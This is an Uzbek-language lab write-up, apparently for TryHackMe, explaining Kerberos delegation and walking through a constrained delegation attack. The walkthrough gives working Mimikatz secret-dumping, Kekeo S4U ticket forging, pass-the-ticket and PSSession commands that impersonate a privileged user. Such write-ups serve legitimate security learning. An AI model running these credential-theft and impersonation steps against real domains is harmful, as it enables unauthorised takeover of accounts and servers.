
# **Kerberos Delegation**

Keyingisi — **Kerberos Delegation**. AD Delegation haqida gap ketganda, odatda mana shu nazarda tutiladi, Permission Delegation emas.

---

## **Kerberos Delegation nima?**

Kerberos Delegation’ning amaliy maqsadi — **biror xizmat (application)** boshqa serverdagi **resursga foydalanuvchi nomidan kira olishi**.

Misol:

* Bizda web-server bor.
* Web-server orqasida SQL server turibdi.
* Web dastur SQL bazaga murojaat qilishi kerak.

Delegation bo‘lmasa, web-server SQL bazaga maxsus **service account** bilan kiradi. Bunda foydalanuvchi huquqlari hisobga olinmaydi.

Delegation bilan esa:

* Foydalanuvchi webga kiradi
* Web-server foydalanuvchi nomidan SQL bazadan ma’lumot so‘raydi
* Ya’ni web-serverga o‘zi uchun SQL huquqlari bermaymiz — foydalanuvchi huquqlari ishlatiladi

---

## **Constrained vs Unconstrained Delegation**

Kerberos delegatsiyasining ikki turi bor:

### **1) Unconstrained Delegation (Eski, juda xavfli)**

* Cheklov yo‘q.
* Agar delegatsiya yoqilgan kompyuterga kimdir **kerberos orqali authenticate** qilsa, tizim u foydalanuvchi uchun **TGT** (ticket-granting ticket) yaratib xotiraga saqlaydi.
* Kompyuter compromise bo‘lsa — attacker TGT’ni olib ketadi va istalgan joyda o‘sha user nomidan harakat qiladi.

Shu sababli bu usul endi “yechim emas, muammo”.

---

### **2) Constrained Delegation (cheklangan delegatsiya)**

Microsoft 2003-yilda kiritgan.

Bu usulda **qaysi service account qaysi servislarga delegatsiya qila olishi** aniq ko‘rsatiladi:

Misollar:

* **HTTP** — web ilovalar uchun
* **CIFS** — file share
* **LDAP** — password reset / directory query
* **HOST** — barcha host aktivitlar
* **MSSQL** — SQL serverga foydalanuvchi nomidan kirish

Ekspluatatsiya qilish Unconstrained’ga qaraganda qiyinroq, lekin baribir kuchli hujumlar qilish mumkin.

Misol:

* Agar sen Constrained Delegation’ga ega bo‘lgan account’ni qo‘lga kiritsang
* Uning **NTLM hashi yoki paroli** bo‘lsa
* O‘zing uchun TGT yasaysan
* So‘ngra ushbu TGT bilan **istalgan foydalanuvchi nomidan TGS** olasan
* Va delegatsiya ruxsati bor servislarga shu foydalanuvchi sifatida kira olasan

---

## **3) Resource-Based Constrained Delegation (RBCD)**

2012-yilda Microsoft kiritgan.

Bunda model butunlay o‘zgaradi:

* Avvalgidek “kim kimga delegatsiya qila oladi” emas
* **Service o‘zi belgilaydi: qaysi account unga delegatsiya qila oladi.**

Ya’ni:

* Ilgari: Web-server account → SQL-server service
* Endi: SQL-service → Web-server account

Agar sen biror service uchun **msDS-AllowedToActOnBehalfOfOtherIdentity** atributini o‘zgartira olsang:

* O‘zingga tegishli accountni shu ro‘yxatga qo‘shasan
* So‘ng TGT yasab, shu service nomidan ish yuritasan

---

# **Constrained Delegation Ekspluatatsiyasi**

Buni amalda TryHackMe labida ishlatasan.

### **1. Delegatsiyani aniqlash**

```powershell
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth
```

Natijada:

**svcIIS** foydalanuvchisi **THMSERVER1** serveridagi **HTTP** va **WSMAN** servislarga delegatsiya qila oladi.

PSSession (PowerShell Remoting) ham aynan HTTP va WSMAN ishlatadi → demak bundan foydalanamiz.

---

### **2. THMWRK1 mashinasida svcIIS parolini olish**

THMWRK1 ustidan admin bo‘lgansan — Mimikatz orqali **LSASecrets** dump qilasan:

```cmd
mimikatz.exe
token::elevate
lsadump::secrets
```

Natija:

* svcIIS account paroli yoki NTLM hash’i qo‘lga tushadi.

---

# **3. Kekeo yordamida Kerberos Delegation hujumi**

### **TGT yaratish**

```cmd
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:PAROL
```

Bu svcIIS uchun TGT yaratadi.

---

### **4. TGS (service ticket) yaratish — S4U hujumi**

Bizga t1_trevor.jones useri nomidan **HTTP** va **WSMAN** servislarga ticket kerak:

```cmd
tgs::s4u /tgt:TGT_svcIIS.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
```

Keyin:

```cmd
tgs::s4u /tgt:TGT_svcIIS.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
```

---

# **5. Mimikatz orqali TGSlarni xotiraga yuklash (ptt)**

```cmd
privilege::debug
kerberos::ptt TGS_http.kirbi
kerberos::ptt TGS_wsman.kirbi
```

Klist bilan tekshirsa bo‘ladi.

---

# **6. Endi PSSession ochamiz**

```powershell
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
whoami
```

Natija:

```
za\t1_trevor.jones
```

Bu — serverdagi **privileged Tier 1 Admin** bo‘lib qolganing degani.

---

# **Xulosa**

Constrained Delegation ekspluatatsiyasi orqali:

* svcIIS parolini topding
* svcIIS nomidan TGT yasading
* TGS orqali t1_trevor.jones userini impersonate qilding
* THMSERVER1 ustidan to‘liq admin bo‘lding
